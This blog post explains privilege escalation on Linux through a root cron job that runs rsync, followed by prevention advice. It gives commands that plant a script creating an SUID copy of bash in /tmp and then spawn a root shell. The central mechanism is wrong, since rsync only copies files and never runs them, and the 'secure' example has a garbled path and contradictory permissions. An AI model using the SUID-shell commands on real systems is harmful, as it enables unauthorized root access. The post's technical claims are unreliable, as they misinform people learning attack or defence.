---
title: "
Privilege Escalation Using Cron and Rsync"
date: 2023-02-05 14:15:24
categories: [privilege-escalation, linux]
tags: [redteam, privilege-escalation, linux]
---

In production environments, cron jobs are often used to schedule maintenance tasks and data backups. However, improper configuration can introduce vulnerabilities that can be exploited for privilege escalation. This article describes a realistic scenario where a cron job configured to use `rsync` can be exploited to gain elevated privileges.
#### Introduction 

Cron jobs allow for the automatic execution of scripts or programs at scheduled times. While useful, misconfigurations or inadequate permissions can lead to serious vulnerabilities. In this example, we will demonstrate how an attacker can exploit a vulnerable cron job to gain elevated privileges.

### Example Scenario 
Consider a scenario where a cron job is configured to back up the directory `/var/html/virtualstore.django.website` to `/backup/virtualstore` every minute. This cron job runs as root:

```plaintext
* * * * * root rsync -av /var/html/virtualstore.django.website/ /backup/virtualstore/
```
The vulnerability arises because the source directory (`/var/html/virtualstore.django.website`) is accessible and modifiable by a non-privileged user.
### Steps for Exploitation 

#### 1. Create a Malicious Script 
The first step is to create a malicious script that will be copied to the destination directory and executed with root privileges. The following script creates an SUID shell at `/tmp/rootbash`.

```bash
echo '#!/bin/bash' > /var/html/virtualstore.django.website/malicious.sh
echo 'cp /bin/bash /tmp/rootbash' >> /var/html/virtualstore.django.website/malicious.sh
echo 'chmod +s /tmp/rootbash' >> /var/html/virtualstore.django.website/malicious.sh
chmod +x /var/html/virtualstore.django.website/malicious.sh
```

#### 2. Modify the Trigger File 

Next, ensure the malicious script is executed by creating or modifying a file that will be interpreted by the cron job.


```bash
echo "/var/html/virtualstore.django.website/malicious.sh" > /var/html/virtualstore.django.website/trigger.sh
chmod +x /var/html/virtualstore.django.website/trigger.sh
```

#### 3. Wait for the Cron Job to Execute 
When the cron job runs, it will synchronize the contents of `/var/html/virtualstore.django.website/` to `/backup/virtualstore/`, including the `malicious.sh` script.
#### 4. Execute the Malicious Script 
After the cron job synchronizes the files, the malicious script will be executed with root privileges, creating an SUID shell at `/tmp/rootbash`.
#### 5. Obtain a Root Shell 

Finally, the attacker can execute the shell with root privileges:


```bash
/tmp/rootbash -p
```

### Prevention 

To prevent this type of vulnerability, follow these best practices:
 
1. **Restrict Access Permissions:** 
  - Ensure that only authorized users can modify the contents of directories used by cron jobs.
 
2. **Validate and Sanitize:** 
  - Implement proper validation and sanitization for any data inputs processed by scripts or cron jobs.
 
3. **Principle of Least Privilege:** 
  - Run cron jobs with the least amount of privilege necessary. Avoid running cron jobs as root unless absolutely necessary.
 
4. **Segregate Directories:** 
  - Use source and destination directories that are not directly accessible by non-privileged users.

### Example of a Secure Cron Job 

To configure a secure cron job, follow these guidelines:

#### Cron Job Configuration 

Add the cron job to the crontab of a specific user with restricted permissions:


```bash
crontab -e
```

Add the following line:


```plaintext
* * * * * rsync -av --delete /var/html/virtualstore.django.website/ /backup/virtualstore/
```

#### Directory Permissions 

Ensure that the directories have restricted permissions:


```bash
# Source directory (only the specific user can modify)
chown -R user:user /var/html/virtualstore.django.website
chmod -R 700 /var/html/virtualstore.django.website

# Destination directory (only root can modify)
chown -R root:root /backup/virtualstore
chmod -R 700 /backup/lojavivirtualstorertual
```

### Conclusion 

Improperly configured cron jobs can lead to privilege escalation vulnerabilities. The example provided demonstrates how a misconfigured cron job can be exploited. By following recommended security practices, such as restricting permissions and running with the least privilege necessary, you can mitigate these risks and protect your environment.


---

**References:**  
1. [HackTricks: Privilege Escalation via Cron Jobs](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
 
2. [TryHackMe Linux Privilege Escalation Room](https://tryhackme.com/room/linprivesc)